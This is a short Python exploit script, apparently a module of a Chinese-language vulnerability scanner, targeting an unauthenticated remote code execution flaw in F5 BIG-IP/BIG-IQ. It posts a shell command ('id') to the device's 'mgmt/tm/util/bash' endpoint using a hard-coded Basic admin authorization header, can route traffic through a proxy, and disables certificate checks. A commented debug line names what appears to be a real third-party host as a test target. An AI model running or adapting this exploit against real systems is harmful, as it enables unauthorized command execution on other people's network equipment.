import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': '',
            'Authorization': 'Basic YWRtaW46QVNhc1M='
        }
        data = {'command': "run", 'utilCmdArgs': "-c id"}
        gf = requests.get(url+"mgmt/tm/util/bash",json=data,cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and 'commandResult' in gf.text:
            uia = "[+]漏洞存在\nmgmt/tm/util/bash\n"+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://jellyfin.timbeck2.com/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ BIG-IP/BIG-IQ  未授权远程代码执行]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)